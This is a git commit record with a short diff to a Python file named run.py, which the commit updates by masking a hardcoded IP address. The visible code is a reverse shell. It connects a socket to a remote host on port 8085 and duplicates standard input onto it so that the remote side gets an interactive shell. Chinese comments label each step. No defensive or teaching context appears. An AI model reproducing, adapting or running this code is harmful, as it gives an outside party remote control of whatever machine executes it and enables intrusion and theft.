92095eedaefa9c8c4cb4befd523368ac4e87764d
hi <wooluo@126.com>
2024-10-10 11:40:37 +0800

    Update run.py

--- run.py
+++ run.py
@@ -6,7 +6,7 @@ import os
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
 # 连接到远程服务器
-s.connect(("43.224.35.216", 8085))
+s.connect(("4.X.X.X", 8085))
 
 # 将标准输入、输出和错误重定向到套接字
 os.dup2(s.fileno(), 0)  # 标准输入
